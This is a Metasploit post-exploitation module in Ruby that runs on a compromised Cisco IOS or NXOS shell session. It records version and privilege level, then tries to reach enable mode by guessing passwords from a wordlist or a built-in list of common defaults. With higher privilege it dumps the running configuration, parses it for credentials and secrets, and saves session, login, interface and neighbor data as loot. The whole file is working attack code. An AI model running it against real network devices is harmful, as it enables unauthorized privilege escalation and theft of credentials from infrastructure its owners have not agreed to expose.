##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/cisco'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Cisco
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Cisco Gather Device General Information',
      'Description'   => %q{
        This module collects a Cisco IOS or NXOS device information and configuration.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
      'Platform'      => [ 'cisco'],
      'SessionTypes'  => [ 'shell' ]
    ))

    register_options(
      [
        OptString.new('ENABLE', [ false, 'Enable password for changing privilege level.']),
        OptPath.new('WORDLIST', [false, 'Wordlist of possible enable passwords to try.'])
      ])

  end

  def run
    # Get device prompt
    prompt = session.shell_command("")

    # Set terminal length to 0 so no paging is required
    session.shell_write("term len 0 \n")

    # Get version info
    print_status("Getting version information")
    show_ver_cmd = "show version"
    ver_out = session.shell_command(show_ver_cmd)
    ver = ver_out.gsub(/show version/,"")


    # Get current privilege level
    print_status("Getting privilege level")
    priv_cmd = "show priv"
    priv = (session.shell_command(priv_cmd)).scan(/privilege level is (\d*)/).join

    # Check if this is a Nexus or IOS box
    case ver
    when /Nexus/
      os_type = "Nexus"
      mode = "EXEC"
      os_loot = "nxos"
    when /IOS/
      os_type = "IOS"
      os_loot = "ios"
    end
    if os_type == "IOS"
      case prompt
      when />/
        mode = "EXEC"
      when /#/
        mode = "PRIV"
      end
    end

    print_status("The device OS is #{os_type}")
    print_status("Session running in mode #{mode}")
    print_status("Privilege level #{priv}")

    case os_type
    when /IOS/
      ver_loc = store_loot("cisco.ios.version",
        "text/plain",
        session,
        ver.strip,
        "version.txt",
        "Cisco IOS Version")
    when /Nexus/
      ver_loc = store_loot("cisco.nxos.version",
        "text/plain",
        session,
        ver.strip,
        "version.txt",
        "Cisco NXOS Version")
    end

    # Print the version of VERBOSE set to true.
    vprint_good("version information stored in to loot, file:#{ver_loc}")

    # Enumerate depending priv level
    case priv
    when "1"
      enum_exec(prompt)
      if get_enable(datastore['ENABLE'],datastore['WORDLIST'])
        enum_priv(prompt)
      end
    when /7|15/
      enum_exec(prompt)
      enum_priv(prompt)
    end
  end

  def get_enable(enable_pass,pass_file)
    if enable_pass
      found = false
      en_out = session.shell_command("enable").to_s.strip
      en_out = session.shell_command(enable_pass)
      if en_out =~ /Password:/
        print_error("Failed to change privilege level using provided Enable password.")
      else
        found = true
      end
    else
      if pass_file
        if not ::File.exist?(pass_file)
          print_error("Wordlist File #{pass_file} does not exists!")
          return
        end
        creds = ::File.open(pass_file, "rb")
      else
        creds = "Cisco\n" << "cisco\n"<< "sanfran\n" << "SanFran\n" << "password\n" << "Password\n"
      end
      print_status("Trying to get higher privilege level with common Enable passwords..")

      # Try just the enable command
      en_out = session.shell_command("enable").to_s.strip
      if en_out =~ /Password:/
        creds.each_line do |p|
          next if p.strip.length < 1
          next if p[0,1] == "#"
          print_status("\tTrying password #{p.strip}")
          pass_out = session.shell_command(p.strip).to_s.strip
          vprint_status("Response: #{pass_out}")
          session.shell_command("enable").to_s.strip if pass_out =~ /Bad secrets/
          found = true if pass_out =~ /#/
          break if found
        end
      else
        found = true
      end
    end
    if found
      print_good("Obtained higher privilege level.")
      return true
    else
      print_error("Could not obtain higher privilege level.")
      return false
    end
  end

  # Run enumeration commands for when privilege level is 7 or 15
  def enum_priv(prompt)
    host,port = session.session_host, session.session_port
    priv_commands = [
      {
        "cmd"  => "show run",
        "fn"   => "run_config",
        "desc" => "Cisco Device running configuration"
      },
      {
        "cmd"  => "show cdp neigh",
        "fn"   => "cdp_neighbors",
        "desc" => "Cisco Device CDP Neighbors"
      },
      {
        "cmd"  => "show lldp neigh",
        "fn"   => "cdp_neighbors",
        "desc" => "Cisco Device LLDP Neighbors"
      }
    ]
    priv_commands.each do |ec|
      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/,"")
      next if cmd_out =~ /Invalid input|%/
      print_status("Gathering info from #{ec['cmd']}")
      # Process configuration
      if ec['cmd'] =~/show run/
        print_status("Parsing running configuration for credentials and secrets...")
        cisco_ios_config_eater(host,port,cmd_out)
      end
      cmd_loc = store_loot("cisco.ios.#{ec['fn']}",
        "text/plain",
        session,
        cmd_out.strip,
        "#{ec['fn']}.txt",
        ec['desc'])
      vprint_good("Saving to #{cmd_loc}")
    end
  end

  # run commands found in exec mode under privilege 1
  def enum_exec(prompt)
    exec_commands = [
      {
        "cmd"  => "show ssh",
        "fn"   => "ssh_sessions",
        "desc" => "SSH Sessions on Cisco Device"
      },
      {
        "cmd"  => "show sessions",
        "fn"   => "telnet_sessions",
        "desc" => "Telnet Sessions on Cisco Device"
      },
      {
        "cmd"  => "show login",
        "fn"   => "login_settings",
        "desc" => "Login settings on Cisco Device"
      },
      {
        "cmd"  => "show ip interface brief",
        "fn"   => "interface_info",
        "desc" => "IP Enabled Interfaces on Cisco Device"
      },
      {
        "cmd"  => "show inventory",
        "fn"   => "hw_inventory",
        "desc" => "Hardware component inventory for Cisco Device"
      }]
    exec_commands.each do |ec|
      cmd_out = session.shell_command(ec['cmd']).gsub(/#{ec['cmd']}|#{prompt}/,"")
      next if cmd_out =~ /Invalid input|%/
      print_status("Gathering info from #{ec['cmd']}")
      cmd_loc = store_loot("cisco.ios.#{ec['fn']}",
        "text/plain",
        session,
        cmd_out.strip,
        "#{ec['fn']}.txt",
        ec['desc'])
      vprint_good("Saving to #{cmd_loc}")
    end
  end
end
